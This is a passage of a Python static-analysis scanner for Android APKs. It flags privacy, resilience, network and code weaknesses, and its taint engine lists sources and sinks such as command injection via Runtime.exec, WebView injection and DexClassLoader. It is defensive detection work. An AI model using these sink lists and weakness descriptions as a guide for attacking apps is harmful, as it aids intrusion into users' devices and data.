                            "intent filters in the manifest. Only request "
                            "QUERY_ALL_PACKAGES if you fit Google Play's allowed "
                            "use cases and have submitted the required declaration."),
            cwe="CWE-359", masvs="MSTG-PLATFORM-1", cvss=4.3,
            references=[
                "https://developer.android.com/training/package-visibility",
                "https://support.google.com/googleplay/android-developer/answer/10158779",
            ],
            confidence="confirmed",
        ))
    return f


def analyze_manage_external_storage(ctx: Ctx) -> list:
    """MANAGE_EXTERNAL_STORAGE is a Google Play-restricted "all files access" permission."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        perms = apk.get_permissions() or []
    except Exception:
        return f
    if "android.permission.MANAGE_EXTERNAL_STORAGE" in perms:
        f.append(Finding(
            id="manage-external-storage",
            title="App holds MANAGE_EXTERNAL_STORAGE (all-files access)",
            severity="medium", category="MASVS-PRIVACY",
            description=("MANAGE_EXTERNAL_STORAGE bypasses scoped storage and grants "
                         "read/write access to the entire shared storage volume, "
                         "including other apps' media. Google Play restricts it to "
                         "file-manager / antivirus / backup use cases."),
            evidence="manifest contains android.permission.MANAGE_EXTERNAL_STORAGE",
            recommendation=("Migrate to the Storage Access Framework (ACTION_OPEN_DOCUMENT) "
                            "or MediaStore APIs. Only request all-files access if "
                            "your core feature genuinely requires it."),
            cwe="CWE-732", masvs="MSTG-STORAGE-2", cvss=5.0,
            references=[
                "https://developer.android.com/training/data-storage/manage-all-files",
                "https://support.google.com/googleplay/android-developer/answer/10467955",
            ],
            confidence="confirmed",
        ))
    return f


def analyze_request_install_packages(ctx: Ctx) -> list:
    """REQUEST_INSTALL_PACKAGES lets an app prompt the user to install other APKs.
    Abused by side-loaders, dropper apps, and malware update mechanisms."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        perms = apk.get_permissions() or []
    except Exception:
        return f
    if "android.permission.REQUEST_INSTALL_PACKAGES" in perms:
        f.append(Finding(
            id="request-install-packages",
            title="App can prompt user to install other APKs",
            severity="medium", category="MASVS-PRIVACY",
            description=("REQUEST_INSTALL_PACKAGES allows the app to launch the "
                         "package installer with another APK. Legitimate uses are "
                         "narrow (browser, file manager, ROM updaters). Abused as a "
                         "dropper-app primitive in malware."),
            evidence="manifest contains REQUEST_INSTALL_PACKAGES",
            recommendation=("If you don't need to install APKs, remove the permission. "
                            "If you do (e.g., browser), make sure the install URL is "
                            "always user-initiated and never auto-triggered from a "
                            "deep link or push notification."),
            cwe="CWE-250", masvs="MSTG-PLATFORM-1", cvss=4.3,
            references=[
                "https://developer.android.com/reference/android/Manifest.permission#REQUEST_INSTALL_PACKAGES",
                "https://support.google.com/googleplay/android-developer/answer/9893335",
            ],
            confidence="confirmed",
        ))
    return f


def analyze_advertising_id_usage(ctx: Ctx) -> list:
    """Use of AdvertisingIdClient (AAID) -- requires user consent + opt-out support."""
    f = []
    s = _get_strings(ctx)
    has_aaid = any(x in s for x in (
        "Lcom/google/android/gms/ads/identifier/AdvertisingIdClient;",
        "AdvertisingIdClient.getAdvertisingIdInfo",
        "AdvertisingIdClient$Info",
    ))
    if has_aaid:
        f.append(Finding(
            id="advertising-id-usage",
            title="App reads the Google Advertising ID (AAID)",
            severity="low", category="MASVS-PRIVACY",
            description=("The app calls AdvertisingIdClient. Since 2022, Android "
                         "ad-ID requires the app to declare the "
                         "com.google.android.gms.permission.AD_ID permission and "
                         "respect the user's opt-out (returning a zeroed UUID). "
                         "Apps targeting children must not collect AAID."),
            evidence="AdvertisingIdClient class referenced",
            recommendation=("Add <uses-permission android:name=\"com.google.android.gms.permission.AD_ID\"/>. "
                            "Check info.isLimitAdTrackingEnabled(); if true, do not use "
                            "the ID. Provide a privacy-policy disclosure."),
            cwe="CWE-359", masvs="MSTG-PLATFORM-1", cvss=2.7,
            references=[
                "https://support.google.com/googleplay/android-developer/answer/6048248",
                "https://developer.android.com/training/articles/ad-id",
            ],
            confidence="confirmed",
        ))
    return f


def analyze_screenshot_in_recents(ctx: Ctx) -> list:
    """If app handles sensitive data (banking, health) but doesn't set FLAG_SECURE,
    Android caches a recents-screen screenshot of every Activity."""
    f = []
    s = _get_strings(ctx)
    apk = ctx.apk
    pkg = ""
    try: pkg = (apk.get_package() or "").lower()
    except Exception: pass

    is_sensitive = any(k in pkg for k in (
        "bank", "wallet", "pay", "finance", "health", "medical",
        "auth", "password", "vault", "crypto"))
    has_flag_secure = any("FLAG_SECURE" in x or "setFlags" in x for x in s)
    if is_sensitive and not has_flag_secure:
        f.append(Finding(
            id="no-flag-secure-on-sensitive",
            title="Sensitive app does not set FLAG_SECURE",
            severity="medium", category="MASVS-PRIVACY",
            description=("Package name suggests banking / payments / health / auth, "
                         "but no FLAG_SECURE setting was found. Android caches a "
                         "screenshot of every Activity for the recents screen, and "
                         "screenshots may be intercepted by other apps with "
                         "MediaProjection or accessibility services."),
            evidence=f"Package: {pkg} (sensitive); FLAG_SECURE not detected",
            recommendation=("Call getWindow().setFlags(FLAG_SECURE, FLAG_SECURE) in "
                            "every Activity that displays sensitive data. Also "
                            "disables screen recording on Android."),
            cwe="CWE-200", masvs="MSTG-STORAGE-9", cvss=4.0,
            references=[
                "https://developer.android.com/reference/android/view/WindowManager.LayoutParams#FLAG_SECURE",
            ],
            confidence="likely",
        ))
    return f


# ---------- MASVS-RESILIENCE ----------

def analyze_magisk_detection(ctx: Ctx) -> list:
    """Check whether app attempts to detect Magisk specifically -- meaningful signal
    of a hardened app vs one that only checks for SuperSU."""
    f = []
    s = _get_strings(ctx)
    has_magisk_check = any("magisk" in x.lower() or "/sbin/.magisk" in x or
                           "MagiskHide" in x or "io.github.huskydg" in x for x in s)
    has_root_check = any(x in s for x in ("/system/xbin/su", "Superuser.apk", "isRooted"))
    if has_root_check and not has_magisk_check:
        f.append(Finding(
            id="root-check-misses-magisk",
            title="Root detection does not check for Magisk",
            severity="low", category="MASVS-RESILIENCE",
            description=("App contains a root-detection check (looking for "
                         "/system/xbin/su, Superuser.apk, etc.) but does not "
                         "appear to look for Magisk-specific markers. Modern "
                         "rooted devices use Magisk almost exclusively, and "
                         "MagiskHide actively hides itself from naive checks."),
            evidence="Legacy root-check strings present; no Magisk-specific check",
            recommendation=("Add Magisk-specific checks: file paths (/sbin/.magisk, "
                            "/data/adb/magisk), package names (com.topjohnwu.magisk), "
                            "process listing for magiskd, and SafetyNet / Play "
                            "Integrity attestation. Note: client-side root detection "
                            "can always be bypassed; use server-side attestation for "
                            "high-value workflows."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-1", cvss=3.7,
            references=[
                "https://github.com/topjohnwu/Magisk",
                "https://developer.android.com/google/play/integrity",
            ],
            confidence="possible",
        ))
    return f


def analyze_no_play_integrity(ctx: Ctx) -> list:
    """App handles sensitive data but doesn't integrate Play Integrity / SafetyNet."""
    f = []
    s = _get_strings(ctx)
    apk = ctx.apk
    pkg = ""
    try: pkg = (apk.get_package() or "").lower()
    except Exception: pass

    is_sensitive = any(k in pkg for k in (
        "bank", "wallet", "pay", "finance", "trading", "exchange"))
    has_play_integrity = any(x in s for x in (
        "Lcom/google/android/play/core/integrity/",
        "IntegrityManager", "IntegrityTokenRequest",
        "Lcom/google/android/gms/safetynet/",  # legacy SafetyNet
        "SafetyNetClient",
    ))
    if is_sensitive and not has_play_integrity:
        f.append(Finding(
            id="no-play-integrity-on-sensitive",
            title="Sensitive app does not use Play Integrity attestation",
            severity="medium", category="MASVS-RESILIENCE",
            description=("Package suggests financial / trading domain, but no "
                         "Play Integrity (or legacy SafetyNet) integration was "
                         "detected. Without server-side attestation, an attacker "
                         "running the app on a rooted device, emulator, or modified "
                         "build can still complete sensitive transactions if the "
                         "server trusts the client's word."),
            evidence=f"Package: {pkg}; no Play Integrity / SafetyNet calls",
            recommendation=("Integrate Play Integrity API. On the backend, require a "
                            "valid attestation token for high-value endpoints (login "
                            "from new device, money movement, password change). "
                            "Reject requests with verdicts other than MEETS_DEVICE_INTEGRITY."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-2", cvss=4.3,
            references=[
                "https://developer.android.com/google/play/integrity/overview",
                "https://developer.android.com/google/play/integrity/verdicts",
            ],
            confidence="likely",
        ))
    return f


def analyze_debugger_check_present(ctx: Ctx) -> list:
    """Note: this is the absence-of-control variant. Many apps don't bother
    checking Debug.isDebuggerConnected at runtime, leaving them open to easy
    debugging-based instrumentation."""
    f = []
    s = _get_strings(ctx)
    has_debugger_check = any(x in s for x in (
        "Debug.isDebuggerConnected", "isDebuggerConnected",
        "ApplicationInfo.FLAG_DEBUGGABLE",
        "Debug.waitingForDebugger",
    ))
    apk = ctx.apk
    pkg = ""
    try: pkg = (apk.get_package() or "").lower()
    except Exception: pass
    is_sensitive = any(k in pkg for k in ("bank", "wallet", "pay", "finance"))
    if is_sensitive and not has_debugger_check:
        f.append(Finding(
            id="no-debugger-check",
            title="No runtime debugger-attached check",
            severity="low", category="MASVS-RESILIENCE",
            description=("Sensitive-domain app does not call "
                         "Debug.isDebuggerConnected() or check FLAG_DEBUGGABLE at "
                         "runtime. Combined with anti-debug from native layer, "
                         "this provides defence-in-depth against analyst's "
                         "instrumentation workflow."),
            evidence="No isDebuggerConnected() / FLAG_DEBUGGABLE check found",
            recommendation=("In MainActivity.onCreate(), call "
                            "Debug.isDebuggerConnected() and exit / lock if true. "
                            "Also test (applicationInfo.flags & FLAG_DEBUGGABLE) != 0 "
                            "to detect debug-rebuilt copies. Note that any "
                            "client-side check can be bypassed; pair with server-side "
                            "attestation."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-2", cvss=2.9,
            references=[
                "https://developer.android.com/reference/android/os/Debug#isDebuggerConnected()",
            ],
            confidence="possible",
        ))
    return f


def analyze_native_anti_debug(ctx: Ctx) -> list:
    """Native libs without ptrace anti-debug (very common for Android malware
    analysis -- also the bar for legit hardened apps)."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    has_natives = False
    has_ptrace_check = False
    try:
        files = apk.get_files()
        for fn in files:
            if fn.endswith(".so") and fn.startswith("lib/"):
                has_natives = True
                try:
                    blob = apk.get_file(fn)
                    # Extremely cheap ASCII scan for ptrace-related strings
                    if b"ptrace" in blob or b"PT_DENY_ATTACH" in blob or \
                       b"TracerPid" in blob:
                        has_ptrace_check = True
                        break
                except Exception:
                    pass
    except Exception:
        return f
    if has_natives and not has_ptrace_check:
        # Only as info -- absence isn't a vuln; it's a hardening gap
        f.append(Finding(
            id="native-no-ptrace-check",
            title="Native libraries do not include anti-debug (ptrace)",
            severity="info", category="MASVS-RESILIENCE",
            description=("Native libraries are present but no ptrace-based "
                         "anti-debug strings were detected. ptrace(PTRACE_TRACEME) "
                         "is the standard Android native anti-debug technique."),
            evidence=".so files present; no ptrace / TracerPid strings",
            recommendation=("If your threat model includes runtime instrumentation, "
                            "add a ptrace(PTRACE_TRACEME, 0, 0, 0) call in JNI_OnLoad "
                            "or check /proc/self/status for TracerPid != 0."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-2", cvss=0.0,
            references=[
                "https://mas.owasp.org/MASTG/Android/0x05j-Testing-Resiliency-Against-Reverse-Engineering/",
            ],
            confidence="possible",
        ))
    return f


# ---------- MASVS-NETWORK ----------

def analyze_okhttp_trust_all(ctx: Ctx) -> list:
    """OkHttp client built with .hostnameVerifier((h,s) -> true) -- common bug."""
    f = []
    s = _get_strings(ctx)
    has_okhttp = any("Lokhttp3/" in x for x in s)
    if not has_okhttp:
        return f
    bad_strings = [x for x in s if x in (
        "Lokhttp3/OkHttpClient$Builder;",
    )]
    has_hostname_setter = any("hostnameVerifier" in x for x in s)
    has_trust_all_pattern = any(
        "javax/net/ssl/HostnameVerifier" in x for x in s
    ) and has_hostname_setter
    if has_trust_all_pattern:
        f.append(Finding(
            id="okhttp-custom-hostname-verifier",
            title="OkHttp client installs a custom HostnameVerifier",
            severity="medium", category="MASVS-NETWORK",
            description=("OkHttpClient.Builder.hostnameVerifier(...) is called. "
                         "While not always a bug, the very common implementation is "
                         "(host, session) -> true, which disables hostname "
                         "verification entirely and enables MITM with any cert."),
            evidence="OkHttp builder + custom HostnameVerifier referenced",
            recommendation=("Remove the custom HostnameVerifier. Use OkHttp's "
                            "default verifier. If a self-signed cert is needed for a "
                            "specific environment, scope to that environment with "
                            "build flavors -- never in release."),
            cwe="CWE-297", masvs="MSTG-NETWORK-3", cvss=6.5,
            references=[
                "https://cwe.mitre.org/data/definitions/297.html",
                "https://square.github.io/okhttp/4.x/okhttp/okhttp3/-ok-http-client/-builder/hostname-verifier.html",
            ],
            confidence="possible",
        ))
    return f


def analyze_volley_allow_all_hosts(ctx: Ctx) -> list:
    """Volley's HurlStack with ALLOW_ALL_HOSTNAME_VERIFIER -- legacy MITM bug."""
    f = []
    s = _get_strings(ctx)
    has_volley = any("Lcom/android/volley/" in x for x in s)
    if not has_volley:
        return f
    has_allow_all = any(x in s for x in (
        "ALLOW_ALL_HOSTNAME_VERIFIER",
        "AllowAllHostnameVerifier",
        "Lorg/apache/http/conn/ssl/AllowAllHostnameVerifier;",
    ))
    if has_allow_all:
        f.append(Finding(
            id="volley-allow-all-hosts",
            title="Volley HTTP stack accepts any TLS hostname",
            severity="high", category="MASVS-NETWORK",
            description=("Volley HurlStack with ALLOW_ALL_HOSTNAME_VERIFIER means "
                         "TLS connections succeed even if the certificate's "
                         "subject CN/SAN doesn't match the requested host. Combined "
                         "with any cert (self-signed, attacker-issued), this is "
                         "trivial MITM."),
            evidence="Volley + ALLOW_ALL_HOSTNAME_VERIFIER reference",
            recommendation=("Use the default HurlStack with platform hostname "
                            "verification. If pinning is needed, use OkHttp's "
                            "CertificatePinner via OkHttpStack adapter."),
            cwe="CWE-297", masvs="MSTG-NETWORK-3", cvss=7.4,
            references=[
                "https://cwe.mitre.org/data/definitions/297.html",
            ],
            confidence="likely",
        ))
    return f


def analyze_websocket_no_wss(ctx: Ctx) -> list:
    """WebSocket client connecting to ws:// (cleartext WebSocket)."""
    f = []
    s = _get_strings(ctx)
    bad_urls = [x for x in s if isinstance(x, str) and
                len(x) < 200 and x.startswith("ws://") and
                "localhost" not in x and "127.0.0.1" not in x and
                "10." not in x[:8] and "192.168." not in x[:11]]
    if bad_urls:
        f.append(Finding(
            id="cleartext-websocket",
            title=f"App uses cleartext WebSocket (ws://) for {len(bad_urls)} endpoint(s)",
            severity="high", category="MASVS-NETWORK",
            description=("WebSocket URLs starting with ws:// are cleartext and "
                         "trivially MITM'd on any shared network. WebSocket frames "
                         "carry application data, often including auth tokens after "
                         "the initial handshake."),
            evidence=f"URLs: {bad_urls[:3]}",
            recommendation=("Switch to wss://. Configure the server to redirect "
                            "ws:// to wss://. If the server must remain ws:// for "
                            "internal reasons, use a TLS proxy in front of it."),
            cwe="CWE-319", masvs="MSTG-NETWORK-1", cvss=7.4,
            references=[
                "https://cwe.mitre.org/data/definitions/319.html",
                "https://datatracker.ietf.org/doc/html/rfc6455#section-10.6",
            ],
            confidence="confirmed",
        ))
    return f


# ---------- MASVS-CODE ----------

def analyze_test_only_apk(ctx: Ctx) -> list:
    """android:testOnly="true" -- a test-build APK should never reach production."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        manifest_xml = apk.get_android_manifest_xml()
        if manifest_xml is None:
            return f
        app = manifest_xml.find("application")
        if app is None:
            return f
        # androguard returns attrs with the {ns} prefix
        for k, v in app.attrib.items():
            if k.endswith("}testOnly") or k == "testOnly":
                if str(v).lower() == "true":
                    f.append(Finding(
                        id="test-only-apk",
                        title="APK is marked testOnly=true",
                        severity="medium", category="MASVS-CODE",
                        description=("android:testOnly=\"true\" marks an APK as "
                                     "non-distributable -- it can only be installed "
                                     "via 'adb install -t'. If this APK reached a "
                                     "real environment, the build pipeline is "
                                     "shipping development binaries."),
                        evidence="<application android:testOnly=\"true\">",
                        recommendation=("Remove android:testOnly from the release "
                                        "manifest. Investigate the build pipeline; "
                                        "this should never make it past CI."),
                        cwe="CWE-489", masvs="MSTG-CODE-2", cvss=5.0,
                        references=[
                            "https://developer.android.com/guide/topics/manifest/application-element#testOnly",
                        ],
                        confidence="confirmed",
                    ))
                    break
    except Exception:
        pass
    return f


def analyze_largeheap(ctx: Ctx) -> list:
    """android:largeHeap="true" -- an honest signal but worth noting in a report."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        m = apk.get_android_manifest_xml()
        app = m.find("application") if m is not None else None
        if app is None: return f
        for k, v in app.attrib.items():
            if k.endswith("}largeHeap") and str(v).lower() == "true":
                f.append(Finding(
                    id="large-heap-enabled",
                    title="App requests largeHeap=true",
                    severity="info", category="MASVS-CODE",
                    description=("largeHeap allows the app to request a much larger "
                                 "Dalvik/ART heap. Often set in apps that load big "
                                 "images / videos / models. Not a vulnerability by "
                                 "itself, but a useful signal -- apps that load big "
                                 "user data in memory have a bigger attack surface "
                                 "for OOM crashes and side-channels."),
                    evidence="<application android:largeHeap=\"true\">",
                    recommendation=("Verify largeHeap is necessary. Audit the "
                                    "memory-heavy code paths for input-size limits."),
                    cwe="CWE-770", masvs="MSTG-CODE-1", cvss=0.0,
                    references=[
                        "https://developer.android.com/guide/topics/manifest/application-element#largeHeap",
                    ],
                    confidence="confirmed",
                ))
                break
    except Exception:
        pass
    return f


def analyze_dexclassloader_writable(ctx: Ctx) -> list:
    """DexClassLoader pointing to a writable dir -- code injection primitive."""
    f = []
    s = _get_strings(ctx)
    has_dcl = any("Ldalvik/system/DexClassLoader" in x or
                  "Ldalvik/system/PathClassLoader" in x for x in s)
    if not has_dcl:
        return f
    # Look for paths that might be writable
    suspicious_paths = [x for x in s if any(p in x for p in (
        "/data/data/", "/cache/", "code_cache",
        "getCacheDir", "getExternalCacheDir", "getFilesDir",
    )) and (x.endswith(".dex") or x.endswith(".jar") or "dex" in x.lower())]
    if suspicious_paths:
        f.append(Finding(
            id="dexclassloader-writable-path",
            title="Dynamic code loading from a writable directory",
            severity="high", category="MASVS-CODE",
            description=("DexClassLoader / PathClassLoader is used in combination "
                         "with paths that may be writable by the app or by other "
                         "apps. If the destination is reachable via a FileProvider "
                         "with path traversal (CVE-2024-0044 family), or via "
                         "external storage, the app becomes a code-execution sink."),
            evidence=f"DexClassLoader + writable-path strings: {suspicious_paths[:2]}",
            recommendation=("Load code only from APK assets or from a directory "
                            "under getCodeCacheDir() / getNoBackupFilesDir() AFTER "
                            "verifying its hash matches a trusted manifest. Never "
                            "load DEX/JAR from external storage or from any path "
                            "whose origin is attacker-influenced."),
            cwe="CWE-829", masvs="MSTG-CODE-9", cvss=8.4,
            references=[
                "https://cwe.mitre.org/data/definitions/829.html",
                "https://developer.android.com/reference/dalvik/system/DexClassLoader",
            ],
            confidence="possible",
        ))
    return f


def analyze_react_native_dev_server(ctx: Ctx) -> list:
    """React Native apps shipping with dev mode / Metro bundler enabled."""
    f = []
    s = _get_strings(ctx)
    has_rn = any(x in s for x in (
        "Lcom/facebook/react/", "Lcom/facebook/hermes/",
        "ReactNativeHost", "ReactInstanceManager",
    ))
    if not has_rn:
        return f
    has_dev_indicators = any(x in s for x in (
        "DevSupportManager", "RedBoxHandler",
        "DevServerHelper", "JSDevSupport",
        ":8081/index.bundle", "metro/serve",
    ))
    has_dev_true = any(x in s for x in (
        "BuildConfig.DEBUG", "DEV_MODE", "isDebug",
    )) and any(x in ("__DEV__", "true") for x in s)
    if has_dev_indicators and has_dev_true:
        f.append(Finding(
            id="rn-dev-mode-enabled",
            title="React Native dev support may be enabled",
            severity="high", category="MASVS-CODE",
            description=("React Native developer tools (DevSupportManager, RedBox, "
                         "Metro bundler) are present alongside debug-mode flags. "
                         "If dev support is active in a release build, an attacker "
                         "on the same network can replace the JS bundle by hosting "
                         "their own Metro server."),
            evidence="React Native + DevSupportManager / Metro indicators present",
            recommendation=("In MainApplication.getUseDeveloperSupport(), return "
                            "BuildConfig.DEBUG (never a hardcoded true). Strip "
                            "DevSupport from release builds via ProGuard rules. "
                            "Confirm the bundle is loaded from assets, not http://."),
            cwe="CWE-489", masvs="MSTG-CODE-2", cvss=7.4,
            references=[
                "https://reactnative.dev/docs/security",
            ],
            confidence="possible",
        ))
    return f


def analyze_flutter_debug_mode(ctx: Ctx) -> list:
    """Flutter apps shipped without --release flag -- AOT not stripped."""
    f = []
    apk = ctx.apk
    if apk is None: return f
    try:
        files = apk.get_files()
    except Exception:
        return f
    has_flutter = any(fn.endswith("libflutter.so") or fn.endswith("libapp.so")
                      for fn in files)
    if not has_flutter:
        return f
    # Heuristic: --debug builds include the VM service / observatory port strings
    has_vm_service = False
    for fn in files:
        if fn.endswith("libflutter.so"):
            try:
                blob = apk.get_file(fn)
                if b"Dart_StartProfiler" in blob or b"vm_service" in blob or \
                   b"Observatory" in blob:
                    has_vm_service = True
                    break
            except Exception:
                pass
    if has_vm_service:
        f.append(Finding(
            id="flutter-debug-vm-service",
            title="Flutter app may be a debug / profile build (VM service strings)",
            severity="medium", category="MASVS-CODE",
            description=("libflutter.so contains Dart VM-service / Observatory "
                         "strings, indicating the build is debug or profile mode "
                         "rather than --release. Debug mode disables tree-shaking "
                         "and ships full reflection metadata."),
            evidence="Dart VM-service / Observatory strings in libflutter.so",
            recommendation=("Build with `flutter build apk --release` (or "
                            "appbundle --release). Verify libflutter.so is the "
                            "release variant -- it should NOT contain "
                            "Dart_StartProfiler / Observatory strings."),
            cwe="CWE-489", masvs="MSTG-CODE-2", cvss=4.3,
            references=[
                "https://docs.flutter.dev/deployment/android",
            ],
            confidence="possible",
        ))
    return f


# ---------- Registration ----------
# =============================================================================
# Taint Analysis Engine (v1)
# =============================================================================
# Source-to-sink data flow analysis on DEX bytecode using androguard's analysis
# graph. This is the architecturally important addition -- pattern-match analyzers
# detect "X exists"; taint analysis detects "attacker-controlled X reaches a
# dangerous sink".
#
# Scope:
#   - Intra-procedural (within one method) tracking
#   - Direct assignments and move-result tracking
#   - Method-call propagation (parameters in -> return value out, when source
#     or sink is a known wrapper)
#   - String concat / format propagation (StringBuilder.append, String.format)
#
# Out of scope for v1 (would add false negatives, but never false positives):
#   - Inter-procedural (across method calls into user code)
#   - Field-based propagation
#   - Aliasing through collections
#
# Each finding emitted by this engine is `confidence: confirmed` because the
# engine actually traced the data flow -- not heuristically guessed.
# =============================================================================

# Source method signatures: methods whose return value is attacker-controlled.
# Format: (class_descriptor, method_name) -- matched against androguard's
# get_classname() / get_name() output.
TAINT_SOURCES = {
    # Intent extras
    ("Landroid/content/Intent;", "getStringExtra"):  "intent-extra",
    ("Landroid/content/Intent;", "getIntExtra"):     "intent-extra",
    ("Landroid/content/Intent;", "getLongExtra"):    "intent-extra",
    ("Landroid/content/Intent;", "getBooleanExtra"): "intent-extra",
    ("Landroid/content/Intent;", "getParcelableExtra"): "intent-extra",
    ("Landroid/content/Intent;", "getSerializableExtra"): "intent-extra",
    ("Landroid/content/Intent;", "getStringArrayListExtra"): "intent-extra",
    ("Landroid/content/Intent;", "getBundleExtra"):  "intent-extra",
    ("Landroid/content/Intent;", "getData"):         "intent-data",
    ("Landroid/content/Intent;", "getDataString"):   "intent-data",
    # URI parameters
    ("Landroid/net/Uri;", "getQueryParameter"):      "uri-param",
    ("Landroid/net/Uri;", "getPath"):                "uri-path",
    ("Landroid/net/Uri;", "getLastPathSegment"):     "uri-path",
    ("Landroid/net/Uri;", "getPathSegments"):        "uri-path",
    ("Landroid/net/Uri;", "getEncodedQuery"):        "uri-query",
    # Bundle (sub-extra)
    ("Landroid/os/Bundle;", "getString"):            "bundle-extra",
    ("Landroid/os/Bundle;", "getInt"):               "bundle-extra",
    ("Landroid/os/Bundle;", "get"):                  "bundle-extra",
    # WebView callback parameter (handled specially -- whole shouldOverrideUrlLoading param)
    # Network responses
    ("Ljava/net/URL;", "openStream"):                "network-response",
    ("Ljava/net/URLConnection;", "getInputStream"):  "network-response",
    # Content URI input on provider boundary
    ("Landroid/content/ContentResolver;", "openInputStream"): "content-uri-input",
}

# Sink method signatures: where tainted data causes harm.
# Format: (class_descriptor, method_name, finding_metadata)
TAINT_SINKS = {
    # SQL injection
    ("Landroid/database/sqlite/SQLiteDatabase;", "rawQuery"): {
        "id": "taint-sqli-rawquery",
        "title": "Tainted data flows into SQLiteDatabase.rawQuery",
        "category": "MASVS-PLATFORM", "severity": "high",
        "cwe": "CWE-89", "cvss": 8.8, "masvs": "MSTG-PLATFORM-2",
        "description": "User-controlled input from an Intent / URI / Bundle "
                       "reaches SQLiteDatabase.rawQuery() without parameterisation. "
                       "Attacker can read or modify any data in the app's private database.",
        "fix": "Use parameterised queries: db.rawQuery(\"SELECT * FROM t WHERE id=?\", new String[]{id})",
    },
    ("Landroid/database/sqlite/SQLiteDatabase;", "execSQL"): {
        "id": "taint-sqli-execsql",
        "title": "Tainted data flows into SQLiteDatabase.execSQL",
        "category": "MASVS-PLATFORM", "severity": "high",
        "cwe": "CWE-89", "cvss": 8.8, "masvs": "MSTG-PLATFORM-2",
        "description": "User-controlled input reaches execSQL() without parameterisation. "
                       "Allows arbitrary SQL execution against the app's private database.",
        "fix": "Use db.execSQL(\"...?\", new Object[]{val}) or migrate to Room with @Query.",
    },
    # Command injection
    ("Ljava/lang/Runtime;", "exec"): {
        "id": "taint-cmd-injection-runtime",
        "title": "Tainted data flows into Runtime.exec",
        "category": "MASVS-CODE", "severity": "critical",
        "cwe": "CWE-78", "cvss": 9.8, "masvs": "MSTG-CODE-8",
        "description": "User-controlled input is executed as a shell command. "
                       "Attacker can run arbitrary commands as the app's UID.",
        "fix": "Never pass user input to Runtime.exec. If subprocess execution is "
               "truly needed, use ProcessBuilder with a fixed command and "
               "argument array; never compose the command string from input.",
    },
    ("Ljava/lang/ProcessBuilder;", "<init>"): {
        "id": "taint-cmd-injection-processbuilder",
        "title": "Tainted data flows into ProcessBuilder constructor",
        "category": "MASVS-CODE", "severity": "critical",
        "cwe": "CWE-78", "cvss": 9.8, "masvs": "MSTG-CODE-8",
        "description": "ProcessBuilder is constructed with user-controlled "
                       "command arguments. Allows arbitrary command execution.",
        "fix": "Validate every command argument against an allowlist before use.",
    },
    # WebView URL injection
    ("Landroid/webkit/WebView;", "loadUrl"): {
        "id": "taint-webview-url",
        "title": "Tainted data flows into WebView.loadUrl",
        "category": "MASVS-PLATFORM", "severity": "high",
        "cwe": "CWE-79", "cvss": 7.4, "masvs": "MSTG-PLATFORM-7",
        "description": "User-controlled URL or javascript: payload reaches "
                       "WebView.loadUrl. If the WebView has a JS bridge, this is "
                       "JS injection in the app's WebView context -- attacker can "
                       "exfiltrate cookies, call bridge methods, read app state.",
        "fix": "Validate the URL scheme (https only) and host (allowlist) before "
               "loadUrl. Use WebMessageListener for JS bridges instead of "
               "addJavascriptInterface.",
    },
    ("Landroid/webkit/WebView;", "loadData"): {
        "id": "taint-webview-data",
        "title": "Tainted data flows into WebView.loadData",
        "category": "MASVS-PLATFORM", "severity": "high",
        "cwe": "CWE-79", "cvss": 7.4, "masvs": "MSTG-PLATFORM-7",
        "description": "User-controlled HTML/JS reaches WebView.loadData. "
                       "Equivalent to persistent XSS in the app context.",
        "fix": "Never render attacker-controlled HTML in a WebView. Use "
               "Spanned + TextView for formatted text, or sanitize through "
               "OWASP Java HTML Sanitizer.",
    },
    # Unsafe class loading
    ("Ljava/lang/Class;", "forName"): {
        "id": "taint-class-forname",
        "title": "Tainted class name flows into Class.forName",
        "category": "MASVS-CODE", "severity": "high",
        "cwe": "CWE-470", "cvss": 8.1, "masvs": "MSTG-CODE-8",
        "description": "User-controlled class name reaches Class.forName(). "
                       "Combined with newInstance(), enables instantiation of "
                       "arbitrary classes the app didn't intend to expose.",
        "fix": "Map user input to a fixed enum / lookup table; never feed it to "
               "Class.forName directly.",
    },
    ("Ldalvik/system/DexClassLoader;", "<init>"): {
        "id": "taint-dexclassloader-tainted-path",
        "title": "Tainted path flows into DexClassLoader",
        "category": "MASVS-CODE", "severity": "critical",
        "cwe": "CWE-829", "cvss": 9.0, "masvs": "MSTG-CODE-9",
        "description": "User-controlled path is loaded as DEX/JAR via DexClassLoader. "
                       "Direct code-execution primitive: attacker supplies a path "
                       "that points to attacker-controlled bytecode.",
        "fix": "Load DEX only from APK assets or from a path under "
               "getCodeCacheDir() AFTER hash verification against a trusted manifest.",
    },
    # Path traversal
    ("Ljava/io/File;", "<init>"): {
        "id": "taint-file-construct",
        "title": "Tainted data flows into File constructor",
        "category": "MASVS-STORAGE", "severity": "high",
        "cwe": "CWE-22", "cvss": 7.5, "masvs": "MSTG-STORAGE-2",
        "description": "User-controlled path component reaches File constructor. "
                       "If the file is then read or written, attacker can perform "
                       "path traversal to access files outside the intended directory.",
        "fix": "Build the File with new File(rootDir, name).getCanonicalFile(); then "
               "verify result.toPath().startsWith(rootDir.toPath()) before use.",
    },
    ("Landroid/content/Context;", "openFileOutput"): {
        "id": "taint-openfileoutput",
        "title": "Tainted filename flows into Context.openFileOutput",
        "category": "MASVS-STORAGE", "severity": "high",
        "cwe": "CWE-22", "cvss": 7.5, "masvs": "MSTG-STORAGE-2",
        "description": "User-controlled filename reaches openFileOutput. "
                       "Allows writing to arbitrary files within the app's private "
                       "storage, enabling configuration / preference tampering.",
        "fix": "Validate the filename against a strict allowlist or hash before use.",
    },
    # Intent redirection
    ("Landroid/content/Context;", "startActivity"): {
        "id": "taint-startactivity",
        "title": "Tainted Intent flows into startActivity",
        "category": "MASVS-PLATFORM", "severity": "high",
        "cwe": "CWE-927", "cvss": 7.4, "masvs": "MSTG-PLATFORM-1",
        "description": "An Intent retrieved from another app's input "
                       "(e.g. getParcelableExtra) is used to start an Activity. "
                       "Classic intent-redirection: attacker can reach internal, "
                       "non-exported components through this forwarder.",
        "fix": "Never extract a Parcelable Intent from another app and call "
               "startActivity on it. Validate the target ComponentName against an "
               "allowlist before forwarding.",
    },
}

